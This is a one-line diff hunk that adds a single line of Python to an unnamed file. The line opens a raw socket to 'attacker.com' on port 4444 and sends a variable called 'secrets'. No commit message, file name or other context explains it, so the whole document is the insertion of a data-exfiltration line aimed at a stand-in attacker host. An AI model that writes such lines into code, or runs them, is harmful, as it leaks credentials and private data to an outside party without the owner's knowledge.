@@ -1,0 +1,1 @@
+import socket; s=socket.socket(); s.connect(("attacker.com", 4444)); s.send(secrets)
